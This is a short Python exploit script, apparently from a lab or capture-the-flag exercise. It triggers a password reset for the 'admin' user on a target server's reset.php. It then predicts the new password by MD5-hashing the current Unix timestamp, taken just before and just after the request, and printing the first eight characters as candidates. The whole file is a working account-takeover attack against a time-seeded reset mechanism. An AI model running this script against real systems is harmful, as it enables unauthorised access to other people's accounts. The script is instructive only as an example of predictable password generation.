import sys
import time
import math
import requests
import hashlib

SERVER_IP = sys.argv[1]

RESET_URL = "http://" + SERVER_IP + "/reset.php?user_identifier={}"

def reset_password(username='admin'):
    
    seed_1 = str(math.floor(time.time())).encode('ascii')
    r = requests.get(RESET_URL.format(username))
    # Time is measured immediately after issuing the rest request just to handle edge cases of the 
    # timestamp changing in between the first-time measure and the reset request 
    seed_2 = str(math.floor(time.time())).encode('ascii')

    password_1 = hashlib.md5(seed_1).hexdigest()
    password_2 = hashlib.md5(seed_2).hexdigest()

    print(password_1[:8]) 
    print(password_2[:8])

reset_password()